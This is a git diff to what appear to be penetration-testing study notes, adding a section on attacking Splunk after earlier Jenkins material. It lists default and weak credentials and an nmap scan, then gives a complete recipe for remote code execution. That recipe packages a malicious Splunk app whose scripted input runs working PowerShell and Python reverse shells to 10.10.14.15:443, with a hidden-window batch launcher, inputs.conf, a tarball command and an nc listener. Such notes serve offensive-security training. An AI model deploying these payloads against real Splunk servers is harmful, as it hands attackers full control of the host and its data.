@@ -588,7 +588,7 @@ Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attac
 
 ## Enumeration
 The default installation typically uses Jenkins’ database to store credentials and does not allow users to register an account. We can fingerprint Jenkins quickly by the telltale login page. <br>
-We may encounter a Jenkins instance that uses weak or default credentials such as admin:admin or does not have any type of authentication enabled.
+We may encounter a Jenkins instance that uses weak or default credentials such as `admin:admin` or does not have any type of authentication enabled.
 
 ## Attacks
 Once we have gained access to a Jenkins application, a quick way of achieving command execution on the underlying server is via the [Script Console](https://www.jenkins.io/doc/book/managing/script-console/). The script console allows us to run arbitrary Groovy scripts within the Jenkins controller runtime. This can be abused to run operating system commands on the underlying server. Jenkins is often installed in the context of the root or SYSTEM account, so it can be an easy win for us.
@@ -631,4 +631,76 @@ Another vulnerability exists in Jenkins 2.150.2, which allows users with JOB cre
 
 # Splunk
 
+## Discovery/Footprinting
+It's possible that we find a forgotten instance of Splunk, that has since automatically converted to the free version, which does not require authentication. <br>
+The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are `admin:changeme`, which are conveniently displayed on the login page. <br>
+The latest version of Splunk sets credentials during the installation process. If the default credentials do not work, it is worth checking for common weak passwords such as `admin`, `Welcome`, `Welcome1`, `Password123`, etc. <br>
+We can discover Splunk with a quick Nmap service scan.
+```
+sudo nmap -sV <ip>
+```
+It might identifies the `Splunkd httpd` service on port 8000 and port 8089, the Splunk management port for communication with the Splunk REST API.
 
+## Attacks
+Splunk has multiple ways of running code, such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts. A common method of gaining remote code execution on a Splunk server is through the use of a scripted input. 
+As Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch scripts. Also, every Splunk installation comes with Python installed, so Python scripts can be run on any Splunk system. A quick way to gain RCE is by creating a scripted input that tells Splunk to run a Python reverse shell script. 
+
+### Abusing Built-In Functionality
+We can utilize [this Splunk package](https://github.com/0xjpuff/reverse_shell_splunk). 
+First we need to create a custom Splunk application using the following directory structure:
+```
+tree splunk_shell/
+```
+output:
+```
+splunk_shell/
+├── bin
+└── default
+```
+The bin directory will contain any scripts that we intend to run and the default directory will have our inputs.conf file. <br>
+Powershell reverse shell:
+```
+#A simple and small reverse shell. Options and help removed to save space. 
+#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+The `inputs.conf` file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present:
+```
+[script://./bin/rev.py]
+disabled = 0  
+interval = 10  
+sourcetype = shell 
+
+[script://.\bin\run.bat]
+disabled = 0
+sourcetype = shell
+interval = 10
+```
+We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner:
+```
+@ECHO OFF
+PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
+Exit
+```
+Once the files are created, we can create a tarball or .spl file:
+```
+tar -cvzf updater.tar.gz splunk_shell/
+```
+The next step is to choose `Install app from file` and upload the application.
+Before uploading the malicious custom app, let's start a listener:
+```
+sudo nc -lvnp 443
+```
+On the `Upload app` page, click on browse, choose the tarball we created earlier and click `Upload`. <br>
+If we were dealing with a Linux host, we would need to edit the rev.py Python script before creating the tarball and uploading the custom malicious app:
+```
+import sys,socket,os,pty
+
+ip="10.10.14.15"
+port="443"
+s=socket.socket()
+s.connect((ip,int(port)))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn('/bin/bash')
+```
+In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.
